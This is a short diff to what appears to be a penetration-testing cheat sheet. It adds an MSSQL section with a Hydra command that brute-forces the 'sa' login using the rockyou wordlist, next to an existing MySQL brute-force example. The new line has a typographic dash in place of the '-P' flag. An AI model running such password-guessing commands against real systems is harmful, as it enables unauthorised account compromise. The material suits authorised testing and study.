@@ -69,3 +69,8 @@ To brute force MySQL services (usually running on port 3306 of the target system
 ```
 root@attacker-system:~# hydra -l root -P /path/to/wordlist.txt (TARGET IP ADDRESS) mysql
 ```
+
+## MSSQL
+```
+root@demon:~# hydra -l sa –P /path/to/rockyou.txt 10.10.10.125 mssql
+```
